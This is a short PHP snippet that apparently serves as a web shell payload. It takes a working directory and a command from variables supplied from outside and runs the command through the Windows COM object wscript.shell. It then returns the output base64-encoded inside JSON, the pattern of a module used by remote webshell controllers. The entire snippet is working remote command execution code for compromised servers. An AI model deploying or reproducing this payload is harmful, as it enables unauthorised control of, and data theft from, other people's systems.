<?php
set_time_limit(0);
$re = array('code'=>1, 'result'=>'');
chdir($pwd);
if(class_exists('COM')){
    $s= new COM('wscript.shell');
    $exec = $s->exec($cmd);
    $stdout = $exec->StdOut();
    $re['result'] = $stdout->ReadAll();
    $re['result'] = base64_encode($re['result']);
}else{
    $re['code'] = 0;
}
echo json_encode($re);